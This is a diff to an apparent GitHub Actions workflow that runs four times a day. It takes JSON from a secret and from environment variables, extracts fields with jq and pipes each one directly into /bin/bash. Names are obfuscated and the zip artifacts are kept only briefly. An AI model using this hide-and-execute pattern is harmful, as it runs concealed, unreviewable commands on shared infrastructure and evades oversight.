@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '29 2,8,14,20 * * *'
+    - cron: '14 5,11,17,23 * * *'
 permissions:
   contents: read
 concurrency:
@@ -17,17 +17,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run task
         env:
-          h55997: ${{ secrets.h55997 }}
+          t658: ${{ secrets.t658 }}
         run: |
-          printf '%s' "$h55997" | jq -r .tepk089 | /bin/bash
-          echo $vi2 | jq -r .jwvac8 | /bin/bash
-          echo $qcjx08 | jq -r .vbm78080 | /bin/bash
-          echo $h1 | jq -r .xeqgg57483 | /bin/bash
-          echo $a4009 | jq -r .eiv685 | /bin/bash
+          printf '%s' "$t658" | jq -r .lkwg7236 | /bin/bash
+          printf '%s' "$gbgu92411" | jq -r .efamp7 | /bin/bash
+          printf '%s' "$t6848" | jq -r .anel9813 | /bin/bash
+          printf '%s' "$s12" | jq -r .a0466 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
         with:
-          name: Kd1SC2dc
+          name: E9wo1ual
           path: "*.zip"
           retention-days: 1
